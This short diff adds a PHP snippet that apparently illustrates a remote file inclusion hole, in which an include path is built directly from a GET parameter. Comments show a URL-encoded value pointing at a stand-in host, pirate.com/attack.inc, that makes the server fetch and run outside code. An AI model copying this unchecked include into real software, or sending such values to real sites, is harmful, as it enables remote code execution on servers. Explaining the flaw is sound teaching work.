@@ -1,0 +1,10 @@
+<pre><code class="php">
+include "{$_GET[’section’]}/data.inc.php";
+
+// calling: http://yourSite.com/?section=news
+// includes: include file "news/data.inc.php"
+
+// calling: http://yourSite.com/?section=http%3A%2F%2Fpirate.com%2Fattack.inc%3F
+// includes: "http://pirate.com/attack.inc?/data.inc.php";
+// Any PHP code contained in attack.inc is executed and run!
+</code></pre>
